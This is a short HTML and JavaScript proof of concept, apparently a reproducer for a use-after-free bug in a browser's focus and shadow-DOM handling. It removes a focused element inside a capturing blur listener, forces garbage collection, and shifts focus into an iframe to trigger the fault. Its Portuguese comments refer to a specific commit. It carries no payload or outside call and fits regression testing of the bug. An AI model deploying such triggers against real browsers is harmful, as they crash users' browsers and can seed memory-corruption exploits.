<!DOCTYPE html>
<html>
<body>
<div id="host"></div>
<iframe id="helperFrame" srcdoc="<input id='subinput'>"></iframe>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);  
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

// Listener idêntico ao do commit, mas usando a sua estratégia de evento/desfoque
document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

// Força a transição de foco usando o contexto do iframe para simular o blur da janela
setTimeout(() => {
    let iframeInput = helperFrame.contentDocument.getElementById('subinput');
    if (iframeInput) {
        iframeInput.focus(); // Tira o foco do documento principal e joga pro iframe
    }
}, 100);
</script>
</body>
</html>
